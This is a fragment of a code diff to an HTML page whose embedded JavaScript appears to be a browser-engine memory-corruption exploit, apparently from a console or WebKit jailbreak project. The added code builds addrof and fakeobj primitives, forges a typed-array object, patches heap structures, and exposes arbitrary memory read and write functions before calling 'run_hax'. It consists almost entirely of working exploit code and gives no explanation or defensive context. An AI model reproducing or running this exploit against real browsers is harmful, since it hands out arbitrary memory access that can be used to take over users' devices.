-                            expl_slave[0] = ((value & 0xFF) | tmp);
-                        }
-                    },
-                    read8: function(addr) {
-                        expl_master[4] = addr.low;
-                        expl_master[5] = addr.hi;
-                        return new int64(expl_slave[0], expl_slave[1]);
-                    },
-                    read4: function(addr) {
-                        expl_master[4] = addr.low;
-                        expl_master[5] = addr.hi;
-                        return expl_slave[0];
-                    },
-                    read2: function(addr) {
-                        expl_master[4] = addr.low;
-                        expl_master[5] = addr.hi;
-                        return expl_slave[0] & 0xFFFF;
-                    },
-                    read1: function(addr) {
-                        expl_master[4] = addr.low;
-                        expl_master[5] = addr.hi;
-                        return expl_slave[0] & 0xFF;
-                    },
-                    leakval: function(obj) {
-                        obj_slave.obj = obj;
-                        return new int64(obj_master[4], obj_master[5]);
-                    }
-                };
-                window.p = prim;
-                run_hax();
-            }
-        </script>
-    </body>
-</html>
+			var arw_master = new Uint32Array(8);
+			var arw_slave = new Uint8Array(1);
+			var obj_master = new Uint32Array(8);
+			var obj_slave = {
+				obj: null
+			};
+			var addrof_slave = boot_addrof(arw_slave);
+			var addrof_obj_slave = boot_addrof(obj_slave);
+			union_i[0] = structureid_low;
+			union_i[1] = structureid_high;
+			union_b[6] = 7;
+			var obj = {
+				jscell: union_f[0],
+				butterfly: true,
+				buffer: arw_master,
+				size: 0x5678
+			};
+	
+			function i48_put(x, a) {
+				a[4] = x | 0;
+				a[5] = (x / 4294967296) | 0;
+			}
+	
+			function i48_get(a) {
+				return a[4] + a[5] * 4294967296;
+			}
+			window.addrof = function(x) {
+				obj_slave.obj = x;
+				return i48_get(obj_master);
+			}
+			window.fakeobj = function(x) {
+				i48_put(x, obj_master);
+				return obj_slave.obj;
+			}
+	
+			function read_mem_setup(p, sz) {
+				i48_put(p, arw_master);
+				arw_master[6] = sz;
+			}
+			window.read_mem_s = function(p, sz) {
+				read_mem_setup(p, sz);
+				return "" + arw_slave;
+			}
+			window.read_mem_b = function(p, sz) {
+				read_mem_setup(p, sz);
+				var b = new Uint8Array(sz);
+				b.set(arw_slave);
+				return b;
+			}
+			window.read_mem_as_string = function(p, sz) {
+				var x = read_mem_b(p, sz);
+				var ans = '';
+				for(var i = 0; i < x.length; i++) ans += String.fromCharCode(x[i]);
+				return ans;
+			}
+			window.ref_mem = function(p, sz) {
+				read_mem_setup(p, sz);
+				return arw_slave;
+			}
+			window.read_mem = function(p, sz) {
+				read_mem_setup(p, sz);
+				var arr = [];
+				for(var i = 0; i < sz; i++) arr.push(arw_slave[i]);
+				return arr;
+			};
+			window.write_mem = function(p, data) {
+				read_mem_setup(p, data.length);
+				for(var i = 0; i < data.length; i++) arw_slave[i] = data[i];
+			};
+			window.read_ptr_at = function(p) {
+				var ans = 0;
+				var d = read_mem(p, 8);
+				for(var i = 7; i >= 0; i--) ans = 256 * ans + d[i];
+				return ans;
+			};
+			window.write_ptr_at = function(p, d) {
+				var arr = [];
+				for(var i = 0; i < 8; i++) {
+					arr.push(d & 0xff);
+					d /= 256;
+				}
+				write_mem(p, arr);
+			};
+			(function() {
+				var magic = boot_fakeobj(boot_addrof(obj) + 16);
+				magic[4] = addrof_slave;
+				magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
+				obj.buffer = obj_master;
+				magic[4] = addrof_obj_slave;
+				magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
+				magic = null;
+			})();
+			(function() {
+				var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
+				write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
+				for(var i = 0; i < needfix.length; i++) {
+					var addr = read_ptr_at(addrof(needfix[i]) + 8);
+					write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
+					write_ptr_at(addr + 8, addr + 20);
+					write_ptr_at(addr + 16, 0x80000014);
+				}
+				write_ptr_at(butterfly + 248, 0x1f0000001f);
+			})();
+			var expl_master = new Uint32Array(8);
+			var expl_slave = new Uint32Array(2);
+			var addrof_expl_slave = addrof(expl_slave);
+			var m = fakeobj(addrof(obj) + 16);
+			obj.buffer = expl_slave;
+			m[7] = 1;
+			obj.buffer = expl_master;
+			m[4] = addrof_expl_slave;
+			m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
+			m[7] = 1;
+			var prim = {
+				write8: function(addr, value) {
+					expl_master[4] = addr.low;
+					expl_master[5] = addr.hi;
+					if(value instanceof int64) {
+						expl_slave[0] = value.low;
+						expl_slave[1] = value.hi;
+					} else {
+						expl_slave[0] = value;
+						expl_slave[1] = 0;
+					}
+				},
+				write4: function(addr, value) {
+					expl_master[4] = addr.low;
+					expl_master[5] = addr.hi;
+					if(value instanceof int64) {
+						expl_slave[0] = value.low;
+					} else {
+						expl_slave[0] = value;
+					}
+				},
+				write2: function(addr, value) {
+					expl_master[4] = addr.low;
+					expl_master[5] = addr.hi;
+					var tmp = expl_slave[0] & 0xFFFF0000;
+					if(value instanceof int64) {
+						expl_slave[0] = ((value.low & 0xFFFF) | tmp);
+					} else {
+						expl_slave[0] = ((value & 0xFFFF) | tmp);
+					}
+				},
+				write1: function(addr, value) {
+					expl_master[4] = addr.low;
+					expl_master[5] = addr.hi;
+					var tmp = expl_slave[0] & 0xFFFFFF00;
+					if(value instanceof int64) {
+						expl_slave[0] = ((value.low & 0xFF) | tmp);
+					} else {
+						expl_slave[0] = ((value & 0xFF) | tmp);
+					}
+				},
+				read8: function(addr) {
+					expl_master[4] = addr.low;
+					expl_master[5] = addr.hi;
+					return new int64(expl_slave[0], expl_slave[1]);
+				},
+				read4: function(addr) {
+					expl_master[4] = addr.low;
+					expl_master[5] = addr.hi;
+					return expl_slave[0];
+				},
+				read2: function(addr) {
+					expl_master[4] = addr.low;
+					expl_master[5] = addr.hi;
+					return expl_slave[0] & 0xFFFF;
+				},
+				read1: function(addr) {
+					expl_master[4] = addr.low;
+					expl_master[5] = addr.hi;
+					return expl_slave[0] & 0xFF;
+				},
+				leakval: function(obj) {
+					obj_slave.obj = obj;
+					return new int64(obj_master[4], obj_master[5]);
+				}
+			};
+			window.p = prim;
+			run_hax();
+		}
+		</script>
+	</body>
+	
+	</html>
